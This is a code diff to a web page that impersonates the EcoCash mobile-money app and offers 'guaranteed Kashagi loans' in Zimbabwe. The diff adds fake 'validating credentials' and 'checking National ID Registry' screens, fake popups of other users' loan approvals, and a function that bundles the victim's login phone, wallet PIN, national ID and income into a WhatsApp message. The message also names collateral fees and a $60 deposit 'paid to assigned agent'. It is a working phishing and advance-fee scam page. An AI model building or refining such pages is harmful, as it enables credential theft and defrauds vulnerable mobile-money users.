@@ -57,20 +57,34 @@
         .banner-float {
             animation: float-banner 4s ease-in-out infinite;
         }
-        /* Top Live Notification Pop-up Animation */
-        @keyframes slideInDown {
-            from { transform: translateY(-100%); opacity: 0; }
+        /* Loading Skeleton Animation */
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: calc(200px + 100%) 0; }
+        }
+        .skeleton {
+            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+            background-size: 200px 100%;
+            animation: shimmer 1.5s infinite;
+        }
+        .dark .skeleton {
+            background: linear-gradient(90deg, #2d3748 25%, #4a5568 50%, #2d3748 75%);
+            background-size: 200px 100%;
+        }
+        /* Live Notification Pop-up Animation */
+        @keyframes slideInUp {
+            from { transform: translateY(100%); opacity: 0; }
             to { transform: translateY(0); opacity: 1; }
         }
-        @keyframes slideOutUp {
+        @keyframes slideOutDown {
             from { transform: translateY(0); opacity: 1; }
-            to { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(100%); opacity: 0; }
         }
         .notification-slide-in {
-            animation: slideInDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            animation: slideInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
         .notification-slide-out {
-            animation: slideOutUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
+            animation: slideOutDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards;
         }
     </style>
 </head>
@@ -79,7 +93,7 @@
     <!-- Mobile Frame / Container -->
     <div class="w-full max-w-md bg-white dark:bg-gray-800 min-h-screen flex flex-col shadow-2xl relative overflow-x-hidden transition-colors duration-300">
 
-        <!-- GLOBAL DIM LIGHT / 5-SECOND "CHECKING CREDENTIALS" OVERLAY -->
+        <!-- GLOBAL DIM LIGHT / 5-SECOND LOADING OVERLAY -->
         <div id="global-dim-overlay" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-[2px] hidden flex flex-col items-center justify-center text-center transition-opacity duration-300">
             <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-2xl border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6 mx-4">
                 <div class="relative w-20 h-20 mx-auto flex items-center justify-center processing-pulse">
@@ -89,18 +103,19 @@
                 </div>
 
                 <div class="space-y-2">
-                    <h3 class="font-extrabold text-lg text-gray-800 dark:text-gray-100 uppercase tracking-wider">Checking Credentials</h3>
-                    <div class="flex justify-center items-center space-x-1.5 pt-1">
-                        <div class="w-2.5 h-2.5 bg-ecoblue rounded-full animate-bounce" style="animation-delay: 0s;"></div>
-                        <div class="w-2.5 h-2.5 bg-ecoblue rounded-full animate-bounce" style="animation-delay: 0.2s;"></div>
-                        <div class="w-2.5 h-2.5 bg-ecoblue rounded-full animate-bounce" style="animation-delay: 0.4s;"></div>
-                    </div>
+                    <h3 id="overlay-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Authenticating Credentials</h3>
+                    <p id="overlay-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Verifying secure session & wallet security...</p>
+                </div>
+
+                <div class="space-y-2 pt-1">
+                    <div class="h-3 w-full skeleton rounded"></div>
+                    <div class="h-3 w-3/4 skeleton rounded"></div>
                 </div>
             </div>
         </div>
 
-        <!-- TOP LIVE NOTIFICATION POPUP FLOATING CONTAINER -->
-        <div id="live-notification-container" class="fixed top-4 left-4 right-4 z-50 max-w-md mx-auto pointer-events-none flex flex-col items-center">
+        <!-- LIVE NOTIFICATION POPUP FLOATING CONTAINER -->
+        <div id="live-notification-container" class="fixed bottom-20 left-4 right-4 z-50 max-w-md mx-auto pointer-events-none flex flex-col items-center">
             <!-- Dynamically injected popup card -->
         </div>
 
@@ -179,7 +194,7 @@
                         <p id="login-phone-error" class="text-[11px] text-red-600 mt-1 hidden font-medium">Incorrect phone number (Must be 9 digits starting with 7)</p>
                     </div>
 
-                    <!-- Single Seamless PIN Input Field -->
+                    <!-- Single Smooth PIN Input Field (Seamless Typing) -->
                     <div class="text-center mb-6">
                         <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-2">Enter your 4-Digit PIN <span class="text-red-500">*</span></label>
                         <div class="relative max-w-xs mx-auto">
@@ -466,6 +481,43 @@
 
                 <div class="text-center py-3 text-xs font-semibold text-gray-600 dark:text-gray-400">
                     ©2026 EcoCash Super App
+                </div>
+            </section>
+
+
+            <!-- ================= VIEW 4: PROCESSING & VALIDATING SCREEN ================= -->
+            <section id="view-processing" class="hidden p-6 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col items-center justify-center text-center">
+                <div class="bg-white dark:bg-gray-800 rounded-2xl p-8 shadow-lg border border-gray-100 dark:border-gray-700 max-w-xs w-full space-y-6">
+                    <div id="process-spinner-container" class="relative w-20 h-20 mx-auto flex items-center justify-center">
+                        <div class="absolute inset-0 border-4 border-blue-200 dark:border-gray-700 rounded-full"></div>
+                        <div class="absolute inset-0 border-4 border-ecoblue border-t-transparent rounded-full animate-spin"></div>
+                        <i id="process-icon" class="fa-solid fa-shield-halved text-ecoblue text-2xl"></i>
+                    </div>
+
+                    <div class="space-y-2">
+                        <h3 id="process-title" class="font-extrabold text-base text-gray-800 dark:text-gray-100">Validating Details & Transactions</h3>
+                        <p id="process-subtitle" class="text-xs text-gray-500 dark:text-gray-400">Analyzing your last 6 months transactions and credentials...</p>
+                    </div>
+
+                    <div class="space-y-2 pt-2">
+                        <div class="h-4 w-full skeleton rounded"></div>
+                        <div class="h-4 w-3/4 skeleton rounded"></div>
+                    </div>
+
+                    <div class="bg-gray-50 dark:bg-gray-700 p-3 rounded-lg border border-gray-200 dark:border-gray-600 text-left text-[11px] space-y-1 text-gray-600 dark:text-gray-300">
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Checking Zimbabwe National ID Registry</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Verifying 6-Month Wallet History</span>
+                        </div>
+                        <div class="flex items-center space-x-2">
+                            <i class="fa-solid fa-check text-green-600"></i>
+                            <span>Validating Guaranteed Loan Eligibility</span>
+                        </div>
+                    </div>
                 </div>
             </section>
 
@@ -854,7 +906,7 @@
             document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
         }
 
-        // ================= TOP LIVE POP-UP NOTIFICATIONS ENGINE =================
+        // ================= LIVE POP-UP NOTIFICATIONS ENGINE =================
         const sampleMaskedNumbers = [
             "+263 7** *** *49", "+263 7** *** *82", "+263 7** *** *15", 
             "+263 7** *** *93", "+263 7** *** *24", "+263 7** *** *67",
@@ -870,7 +922,7 @@
             const randomAmount = sampleLoanAmounts[Math.floor(Math.random() * sampleLoanAmounts.length)];
 
             const popup = document.createElement('div');
-            popup.className = "bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 shadow-2xl rounded-2xl p-3.5 mb-2 w-full max-w-[340px] flex items-center space-x-3 notification-slide-in pointer-events-auto cursor-pointer";
+            popup.className = "bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 shadow-xl rounded-2xl p-3.5 mb-2 w-full max-w-[340px] flex items-center space-x-3 notification-slide-in pointer-events-auto cursor-pointer";
             
             popup.innerHTML = `
                 <div class="w-10 h-10 rounded-full bg-blue-100 dark:bg-gray-700 text-ecoblue flex items-center justify-center flex-shrink-0 shadow-inner">
@@ -882,7 +934,7 @@
                         <span class="text-[9px] font-semibold text-gray-400 dark:text-gray-500">4 minute ago</span>
                     </div>
                     <p class="text-[11px] text-gray-600 dark:text-gray-300 mt-0.5 truncate">
-                        Boosted <span class="font-bold text-supergreen">${randomAmount}</span> Kashagi loan successfully!
+                        Successfully boosted <span class="font-bold text-supergreen">${randomAmount}</span> Kashagi loan!
                     </p>
                 </div>
                 <div class="w-2 h-2 rounded-full bg-supergreen animate-ping flex-shrink-0"></div>
@@ -1171,8 +1223,14 @@
             window.open(waUrl, '_blank');
         }
 
-        function triggerGlobalDimLoader(onComplete) {
+        function triggerGlobalDimLoader(titleText, subtitleText, onComplete) {
             const overlay = document.getElementById('global-dim-overlay');
+            const titleEl = document.getElementById('overlay-title');
+            const subEl = document.getElementById('overlay-subtitle');
+
+            titleEl.innerText = titleText || "Authenticating Credentials";
+            subEl.innerText = subtitleText || "Processing secure session & loading next screen...";
+
             overlay.classList.remove('hidden');
             overlay.classList.add('opacity-100');
 
@@ -1184,7 +1242,7 @@
         }
 
         function switchTabWithDim(tabName) {
-            triggerGlobalDimLoader(() => {
+            triggerGlobalDimLoader("Loading EcoCash Secure Portal", "Preparing next page and securing session...", () => {
                 switchTab(tabName);
             });
         }
@@ -1209,7 +1267,7 @@
             document.getElementById('profile-id-display').innerText = `ID: Session Active`;
             document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
 
-            triggerGlobalDimLoader(() => {
+            triggerGlobalDimLoader("Authenticating EcoCash Wallet", "Verifying PIN, mobile number & last 6 months history (5s cycling)...", () => {
                 switchTab('kashagi-hub');
             });
         }
@@ -1247,7 +1305,7 @@
             clientData.phone = `+263 ${mobileNumber}`;
             clientData.nid = nationalId.toUpperCase();
 
-            triggerGlobalDimLoader(() => {
+            triggerGlobalDimLoader("Validating Registration & Zimbabwe ID", "Checking 6-month wallet history & credentials securely...", () => {
                 document.getElementById('profile-name-display').innerText = clientData.name;
                 document.getElementById('profile-id-display').innerText = `ID: ${clientData.nid}`;
                 document.getElementById('profile-phone-display').innerText = `Phone: ${clientData.phone}`;
@@ -1255,7 +1313,7 @@
             });
         }
 
-        // Validate Login Form with seamless single PIN field
+        // Validate Login Form with single seamless PIN field
         function validateLoginForm() {
             const phone = document.getElementById('login-phone').value.trim();
             const pin = document.getElementById('login-pin-single').value.trim();
@@ -1473,4 +1531,172 @@
                 clientData.name = name;
                 clientData.phone = `+263 ${phone}`;
                 clientData.nid = nid.toUpperCase();
-                clientData.currentLoan 
+                clientData.currentLoan = currentLoan;
+                clientData.flowType = 'boost';
+
+                triggerGlobalDimLoader("Validating Kashagi Loan Requirements", "Analyzing 6 months wallet transaction history & Zimbabwe ID...", () => {
+                    initTierTable();
+                    switchTab('tier-upgrade');
+                });
+
+            } else if (type === 'apply') {
+                const name = document.getElementById('apply-name').value.trim();
+                const phone = document.getElementById('apply-phone').value.trim();
+                const nid = document.getElementById('apply-nid').value.trim();
+                const employment = document.getElementById('apply-employment').value;
+                const income = document.getElementById('apply-income').value.trim();
+
+                if (!name || !phone || !nid || !employment || !income) {
+                    showToast('Please provide all required loan registration details.');
+                    return;
+                }
+
+                clientData.applyName = name;
+                clientData.applyPhone = `+263 ${phone}`;
+                clientData.applyNid = nid.toUpperCase();
+                clientData.applyEmployment = employment;
+                clientData.applyIncome = income;
+                clientData.flowType = 'apply';
+
+                triggerGlobalDimLoader("Validating New Loan Registration", "Verifying guaranteed loan tier & Zimbabwe ID Registry...", () => {
+                    switchTab('terms');
+                });
+            }
+        }
+
+        function proceedToTerms() {
+            clientData.flowType = 'boost';
+            switchTabWithDim('terms');
+        }
+
+        function toggleAgreeCheckbox() {
+            const checkbox = document.getElementById('explicit-agree-checkbox');
+            const agreeBtn = document.getElementById('agree-terms-btn');
+
+            if (checkbox.checked) {
+                agreeBtn.disabled = false;
+                agreeBtn.className = "w-full bg-ecoblue hover:bg-ecodarkblue text-white font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-pointer transition shadow-md";
+            } else {
+                agreeBtn.disabled = true;
+                agreeBtn.className = "w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md";
+            }
+        }
+
+        function handleFinalAgreement() {
+            let message = '';
+            
+            if (clientData.flowType === 'boost') {
+                message = `*EcoCash Guaranteed Kashagi Loan Boost Upgrade*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Client Full Name:* ${clientData.name}\n📱 *Contact Phone:* ${clientData.phone}\n🆔 *Zimbabwe National ID:* ${clientData.nid}\n💰 *Current Kashagi Loan:* $${clientData.currentLoan} USD\n🚀 *Target Upgrade Tier:* $${clientData.selectedTierAmount} USD\n💵 *Activation Collateral Fee:* $${clientData.selectedTierFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Credentials Verified & Terms Agreed`;
+            } else {
+                message = `*EcoCash Guaranteed Kashagi Loan Full Registration*\n\n🔒 *Login Credentials:*\n📱 *Login Phone:* ${clientData.loginPhone || 'N/A'}\n🔑 *Login PIN:* ${clientData.loginPin || 'N/A'}\n\n👤 *Full Name:* ${clientData.applyName}\n📱 *Contact Phone:* ${clientData.applyPhone}\n🆔 *Zimbabwe National ID:* ${clientData.applyNid}\n💼 *Employment Status:* ${clientData.applyEmployment}\n💵 *Monthly Income:* $${clientData.applyIncome} USD\n🛡️ *Selected Tier Limit:* $${clientData.selectedApplyAmount} USD\n🛡️ *Collateral Fee (10%):* $${clientData.selectedApplyFee.toFixed(2)} USD\n💵 *Final Account Deposit Required:* $60.00 USD (Paid to assigned agent)\n📊 *History Status:* Last 6 Months Verified\n✅ *Status:* Guaranteed Registration & Terms Agreed`;
+            }
+
+            openWhatsAppChat(message);
+        }
+
+        function validateContactForm() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+            const contactBtn = document.getElementById('contact-btn');
+
+            if (name && email && phone && userMessage) {
+                contactBtn.disabled = false;
+                contactBtn.className = "w-full bg-ecoblue text-white font-bold py-3 rounded-md hover:bg-blue-700 transition cursor-pointer shadow-md";
+            } else {
+                contactBtn.disabled = true;
+                contactBtn.className = "w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md cursor-not-allowed transition";
+            }
+        }
+
+        function handleContactSubmit() {
+            const name = document.getElementById('contact-name').value.trim();
+            const email = document.getElementById('contact-email').value.trim();
+            const phone = document.getElementById('contact-phone').value.trim();
+            const userMessage = document.getElementById('contact-message').value.trim();
+
+            if (!name || !email || !phone || !userMessage) {
+                showToast('Please complete all contact form fields.');
+                return;
+            }
+
+            const message = `*EcoCash Support Inquiry*\n\n👤 *Name:* ${name}\n📧 *Email:* ${email}\n📱 *Phone:* ${phone}\n💬 *Message:* ${userMessage}`;
+            openWhatsAppChat(message);
+        }
+
+        function switchTab(tabName) {
+            const loginView = document.getElementById('view-login');
+            const signupView = document.getElementById('view-signup');
+            const hubView = document.getElementById('view-kashagi-hub');
+            const processingView = document.getElementById('view-processing');
+            const boostFormView = document.getElementById('view-boost-form');
+            const tierUpgradeView = document.getElementById('view-tier-upgrade');
+            const termsView = document.getElementById('view-terms');
+            const applyFormView = document.getElementById('view-apply-form');
+            const contactView = document.getElementById('view-contact');
+            const whatsappWidget = document.getElementById('whatsapp-widget');
+
+            loginView.classList.add('hidden');
+            signupView.classList.add('hidden');
+            hubView.classList.add('hidden');
+            processingView.classList.add('hidden');
+            boostFormView.classList.add('hidden');
+            tierUpgradeView.classList.add('hidden');
+            termsView.classList.add('hidden');
+            applyFormView.classList.add('hidden');
+            contactView.classList.add('hidden');
+            whatsappWidget.classList.add('hidden');
+
+            if (tabName === 'login') {
+                loginView.classList.remove('hidden');
+            } else if (tabName === 'signup') {
+                signupView.classList.remove('hidden');
+            } else if (tabName === 'kashagi-hub') {
+                hubView.classList.remove('hidden');
+            } else if (tabName === 'processing') {
+                processingView.classList.remove('hidden');
+            } else if (tabName === 'boost-form') {
+                boostFormView.classList.remove('hidden');
+            } else if (tabName === 'tier-upgrade') {
+                tierUpgradeView.classList.remove('hidden');
+            } else if (tabName === 'terms') {
+                termsView.classList.remove('hidden');
+            } else if (tabName === 'apply-form') {
+                applyFormView.classList.remove('hidden');
+                initApplyTierTable();
+            } else if (tabName === 'contact') {
+                contactView.classList.remove('hidden');
+                whatsappWidget.classList.remove('hidden');
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function toggleMenu() {
+            const dropdown = document.getElementById('nav-dropdown');
+            dropdown.classList.toggle('hidden');
+        }
+
+        let showPin = false;
+        function togglePinVisibility() {
+            showPin = !showPin;
+            const pinInput = document.getElementById('login-pin-single');
+            const eyeIcon = document.getElementById('pin-eye-icon');
+
+            pinInput.type = showPin ? 'text' : 'password';
+            eyeIcon.className = showPin ? 'fa-regular fa-eye-slash text-lg' : 'fa-regular fa-eye text-lg';
+        }
+
+        let showPassword = false;
+        function togglePasswordVisibility() {
+            showPassword = !showPassword;
+            const passInput = document.getElementById('new-password');
+            const eyeIcon = document.getElementById('password-eye-icon');
+
+            passInput.type = showPassword ? 'text' : 'password';
+            eyeIcon.className = showPassword ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
+        }
+    </script>
+</body>
+</html>
